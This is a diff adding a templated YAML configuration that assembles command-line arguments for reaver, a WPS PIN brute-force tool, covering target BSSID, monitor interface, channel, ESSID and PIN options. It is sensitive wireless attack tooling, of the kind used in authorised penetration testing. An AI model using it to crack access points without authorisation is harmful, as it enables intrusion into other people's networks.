@@ -1,0 +1,49 @@
+# Reaver WPS Cracker Configuration
+# This file generates a command-line invocation for reaver based on target parameters.
+#
+# Self-documenting template: every variable uses its schema default, and every
+# directive is preceded by the field's description as a comment.
+
+# Command to execute
+command: "reaver"
+
+# Arguments for the reaver command
+args:
+  # BSSID of the target Access Point.
+  - "-b {{ (target_bssid | default('AA:BB:CC:DD:EE:FF')) | string }}"
+  # Name of the wireless interface in monitor mode.
+  - "-i {{ (interface_name | default('wlan0mon')) | string }}"
+  # 802.11 channel of the target AP.
+  - "-c {{ (channel | default(6)) | int }}"
+{% if (fixed_channel | default(True)) | bool %}
+  # Disable channel hopping.
+  - "-f"
+{% endif %}
+{% if (verbose_level | default(2)) | int > 0 %}
+  # Verbosity level (-v or -vv). 1 for -v, 2 for -vv.
+  - "-{{ 'v' * ((verbose_level | default(2)) | int) }}"
+{% endif %}
+{% set _essid = (essid | default('')) | string %}
+{% if _essid %}
+  # ESSID of the target AP. Empty string means omit this argument.
+  - "-e {{ _essid }}"
+{% endif %}
+{% set _host_mac = (host_mac | default('')) | string %}
+{% if _host_mac %}
+  # MAC address of the host system. Empty string means omit this argument.
+  - "-m {{ _host_mac }}"
+{% endif %}
+{% set _pin = (pin | default('')) | string %}
+{% if _pin %}
+  # Specific WPS PIN to attempt. Empty string means omit this argument.
+  - "-p {{ _pin }}"
+{% endif %}
+{% set _output_file = (output_file | default('')) | string %}
+{% if _output_file %}
+  # File path for log output. Empty string means stdout.
+  - "-o {{ _output_file }}"
+{% endif %}
+{% if (use_5ghz | default(False)) | bool %}
+  # Enable 5GHz channel support.
+  - "-5"
+{% endif %}
